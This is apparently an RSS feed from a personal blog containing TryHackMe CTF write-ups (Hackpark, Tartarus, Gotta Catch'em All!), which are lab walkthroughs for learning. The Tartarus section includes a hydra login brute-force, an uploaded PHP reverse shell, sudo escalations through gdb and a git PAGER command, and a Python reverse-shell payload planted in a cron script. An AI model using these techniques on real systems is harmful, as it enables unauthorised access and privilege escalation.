+[*] Meterpreter session 3 opened (REDACTED:4444 -&amp;gt; 10.10.66.180:49427) at 2020-08-25 15:23:45 -0500
+
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;flags&quot;&gt;Flags&lt;/h2&gt;
+
+&lt;p&gt;And of course, now that we’re the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; user, we can grab our flags.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_flags.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As for the remaining odd questions the room has we can get that info with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; as well as by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winpeas&lt;/code&gt; to see what the suspicious service and binary are.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 25 Aug 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Hackpark</link>
+        <link href="http://localhost:8000/Hackpark"/>
+        <guid isPermaLink="true">http://localhost:8000/Hackpark</guid>
+      </item>
+    
+      <item>
+        <title>Tartarus Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---tartarus&quot;&gt;TryHackMe - Tartarus&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This is an easy room on &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt;. TryHackMe is a great resource for anybody looking to learn more about cybersecurity and CTFs. The room states this is for beginners and focuses on enumeration and basic privelege escalation techniques. To start this box, I’ve made a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tartarus&lt;/code&gt; directory and an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; directory within that to hold all the scans for the box.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap Scan&lt;/h2&gt;
+
+&lt;p&gt;Here’s the output from the nmap scan:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC -sV -oN nmap/tartarus_initial.txt 10.10.17.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 08:37 CDT
+Nmap scan report for 10-10-17-3-static.midco.net (10.10.17.3)
+Host is up (0.13s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.11.12.75
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
+|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
+|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.43 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ftp-enumeration&quot;&gt;ftp Enumeration&lt;/h2&gt;
+
+&lt;p&gt;The nmap scan reveals that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; service allows for anonymous login. Logging in we find a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt&lt;/code&gt;. using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; and taking a look on our attacking machine reveals nothing…
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_ftp.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, there was an extra directory than usual in the ftp service. It’s easy to overlook since it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;...&lt;/code&gt;. Once we get into the directory, we see another file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yougotgoodeyes.txt&lt;/code&gt;. That file does have some good info.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat yougotgoodeyes.txt
+/sUp3r-s3cr3t
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+
+&lt;p&gt;The contents of the ftp file look like a web directory, so we’ll head over there to see what’s in the directory. It looks like there’s a login page in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sUp3r-s3cr3t&lt;/code&gt; directory.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_login.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Considering the fact that we have no credentials to try, let’s keep looking at the webpage. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gobuster&lt;/code&gt; returns nothing, but checking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; we get an interesting hint:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-Agent: *
+Disallow : /admin-dir
+
+I told d4rckh we should hide our things deep.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Following the hint and navigating to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin-dir&lt;/code&gt; directory we get a couple of files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credentials.txt&lt;/code&gt;. I’m going to try and use these files to brute force into the login page we found earlier.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;assets/images/tartarus/tartarus_admin.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
+
+&lt;p&gt;We’ll be using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt; to brute force into the login. Honestly the syntax for brute forcing http-post-forms with hydra has been a little tricky so I’m glad for the opportunity to test out how to form the command. Here’s the basic syntax for hydra:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L /path/to/username.txt -P /path/to/passwords.txt 10.10.9.176 http-post-form &quot;/path/to/login:username=^USER^&amp;amp;password=^PASS^:error message here&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We already know the path to the login, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sUp3r-s3cr3t/authenticate.php&lt;/code&gt;. We also know the username file and the password file, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credentials.txt&lt;/code&gt;. If we try logging into the page incorrectly we get a message saying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Incorrect username!&lt;/code&gt;. So the command ends up being:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L userid -P credentials.txt 10.10.9.176 http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^:Incorrect username&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We get the following in return:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we know the username. So we can specify the command a bit more and get the password. Trying to login with the correct username but not password gives us an error message of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Incorrect password!&lt;/code&gt; so now we can alter our command:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l CORRECT_USERNAME -P credentials.txt 10.10.9.176 http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^:Incorrect password!&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;And here are the following results:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_enox.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can login and are greeted with a page allowing us to upload a file. We can upload a reverse shell and set a listener on our attacking machine to gain our initial access.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;assets/images/tartarus/tartarus_upload.png&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;It was at this point that I started to have some trouble finding where I uploaded my reverse shell. I tried navigating to whatever directories I had already discovered and looking for my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; file, but I had no such luck. So I turned to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; to see what else was behind the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sUp3r-s3cr3t&lt;/code&gt; directory.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster dir -u http://10.10.202.140/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100 -o gobuster_secret.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.202.140/sUp3r-s3cr3t/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/08/17 07:30:13 Starting gobuster
+===============================================================
+/home.php (Status: 302)
+/images (Status: 301)
+/authenticate.php (Status: 200)
+Progress: 55037 / 220561 (24.95%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/08/17 07:32:38 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aha! The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;images&lt;/code&gt; folder looks like a great place to look. Looking in there, there’s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads&lt;/code&gt; folder as well. It’s in there we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_shell.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we just load that page with a netcat listener on our attacking machine and we’ll get our shell.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_initialshell.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-pt1&quot;&gt;Privilege Escalation Pt.1&lt;/h2&gt;
+
+&lt;p&gt;Basic enumeration of other parts of the file system gives us two other users, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thirtytwo&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d4rckh&lt;/code&gt;. Looking inside of the home directory of ‘d4rckh’ we see the user flag, and it turns out we can cat that flag as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_userflag.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;More enumeration lets us know we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thirtytwo&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Matching Defaults entries for www-data on ubuntu-xenial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    (thirtytwo) NOPASSWD: /var/www/gdb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Searching up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt; command on &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFObins&lt;/a&gt; tells us a command we can run to get a shell as that user.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb -nx -ex '!sh' -ex quit&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Modifying that command for our purposes gives us:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit        
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
+
+whoami
+thirtytwo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We now have a shell as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thirtytwo&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-pt2&quot;&gt;Privilege Escalation Pt.2&lt;/h2&gt;
+
+&lt;p&gt;We need to move to user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d4rckh&lt;/code&gt;. Looking in the home directory for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thirtytwo&lt;/code&gt;, there’s a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;note.txt&lt;/code&gt;. It reads:
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hey 32, the other day you were unable to clone my github repository.
+Now you can use git. Took a while to fix it but now its good :)
+
+~D4rckh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hmm. This looks similar to the lateral movement we just did. For this escalation to work we first we need to stabilize the shell. My recommended way is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stabilize_shell.sh&lt;/code&gt; script in John Hammond’s repository &lt;a href=&quot;https://github.com/JohnHammond/poor-mans-pentest&quot;&gt;here&lt;/a&gt;, but you can also do so manually following the method &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;here&lt;/a&gt;. Either way, I recommended you check out John Hammond’s youtube channel, it’s been a great resource for me on this OSCP journey.&lt;/p&gt;
+
+&lt;p&gt;After the stabilization, we should do a little more research on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; command on &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFObins&lt;/a&gt;. It turns out we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGER='sh -c &quot;exec sh 0&amp;lt;&amp;amp;1&quot;' sudo -u d4rckh /usr/bin/git -p help&lt;/code&gt; to invoke git with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less&lt;/code&gt; command. From there we can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!/bin/bash&lt;/code&gt; to give us a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d4rckh&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_d4rckh.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;root-privilege-escalation&quot;&gt;Root Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d4rckh&lt;/code&gt; has a file in his home directory named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cleanup.py&lt;/code&gt;. It turns out we have write permissions for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cleanup.py&lt;/code&gt;, and it runs every 2 minutes. We know it runs every two mintues by checking the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/crontab&lt;/code&gt;, and that we have write permission by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; in the directory containing the file.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_crontab.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;So now all we have to do is rewrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cleanup.py&lt;/code&gt; to give us a reverse shell on our attacking machine. You can find the python3 reverse shell on &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentest monkey&lt;/a&gt;. We will need to modify it so it’s not a terminal command as well as change the ip address to our own. It should look something like the following with your own ip substituted.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.10.1&quot;,1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.c
+all([&quot;/bin/sh&quot;,&quot;-i&quot;])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we just set up a listener, and wait 2 minutes.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/tartarus/tartarus_root.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Rooted! This box was great. It really made you pay attention to detail which is what enumeration is all about. Thanks to csenox who made the box and for tryhackme for hosting it.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 18 Aug 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Tartarus</link>
+        <link href="http://localhost:8000/Tartarus"/>
+        <guid isPermaLink="true">http://localhost:8000/Tartarus</guid>
+      </item>
+    
+      <item>
+        <title>Gotta Catch'em All! Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---gotta-catchem-all&quot;&gt;TryHackMe - Gotta Catch’em All!&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This is a writeup of the Gotta Catch’em All! room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. TryHackMe has been the single greatest resource for a n00b like me to gain some hacking skills over the past seven months or so. Not only are the walkthroughs super helpful, but the cost is very reasonable and features just keep coming. If you’re interested in cybersecurity, give it a look. I’m going to be honest here, the real reason I’m doing this room is for nostalgia’s sake. I loved pokemon as a kid so I’m pretty excited to see what this box has in store.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap Scan&lt;/h2&gt;
+
+&lt;p&gt;As always, I’m going to start the box by organizing my directories. I’ll name the main directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pokemon&lt;/code&gt; and place an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; directory inside of it to hold all the scans.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC -sV -oN nmap/pokemon_initial.txt 10.10.38.223
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 11:46 CDT
+Nmap scan report for 10-10-38-223-static.midco.net (10.10.38.223)
+Host is up (0.14s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|_  2048 58:14:75:69:1e:a9:59:5f:b2:3a:69:1c:6c:78:5c:27 (RSA)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Can You Find Them All?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 152.10 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Looks like there’s two ports open, 22 and 80 running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; respectively. The website greets us with the default Apache 2 welcome screen. Running gobuster gives us nothing of importance, but looking at the source code gives us some interesting things.&lt;/p&gt;
+
+&lt;p&gt;We get a script tag with random pokemon, in addition to that it tells us to check the console and gives us an array of those random pokemon when we get there. There are also some html tags toward the bottom of the home page that look suspicious so I’ll try logging in via ssh with the tags as creds.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/pokemon/pokemon_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold-and-user-flags&quot;&gt;Foothold and User Flags&lt;/h2&gt;
+
+&lt;p&gt;It worked! Moving into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Desktop&lt;/code&gt; directory reveals a zip file. Unzipping the file gives us a directory and inside there is a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grass-type.txt&lt;/code&gt;. Looking at the file, it appears to be in hex. Plugging that into &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; gives us the answer.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/pokemon/pokemon_grass.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Poking around a little bit more I found a directory in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;why_am_i_here ?&lt;/code&gt;. The directory contained a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fire-type.txt&lt;/code&gt;. The text is encoded in what appears to be base64 so if we run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat fire-type.txt | base64 -d&lt;/code&gt; we can get the decoded flag.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/pokemon/pokemon_fire.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
